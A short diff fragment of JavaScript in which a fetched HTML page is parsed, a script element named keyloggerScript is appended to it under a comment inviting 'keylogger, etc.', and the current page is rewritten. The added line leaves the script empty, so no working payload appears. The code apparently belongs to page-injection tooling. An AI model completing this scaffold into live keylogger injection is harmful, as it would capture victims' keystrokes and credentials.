@@ -19,6 +19,7 @@
         //also add in your various things, like keylogger, etc.
         var htmlDocumentDom = httpRequest.response;
         var keyloggerScript = htmlDocumentDom.createElement("script");
+        keyloggerScript.textContent = "";
         htmlDocumentDom.documentElement.appendChild(keyloggerScript);
         var htmlDocumentFileText = new XMLSerializer().serializeToString(htmlDocumentDom);
         document.open();
